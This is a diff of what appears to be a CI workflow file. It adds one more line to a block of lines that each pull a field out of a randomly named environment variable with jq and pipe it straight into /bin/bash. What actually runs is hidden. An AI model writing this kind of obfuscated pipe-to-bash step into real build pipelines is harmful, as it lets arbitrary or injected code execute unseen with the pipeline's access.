@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$kikb59839" | jq -r .cj25 | /bin/bash
           echo $gnuu95 | jq -r .xh9 | /bin/bash
           printf '%s' "$vxku997" | jq -r .dvdo8 | /bin/bash
+          echo $ftp17977 | jq -r .iki2511 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
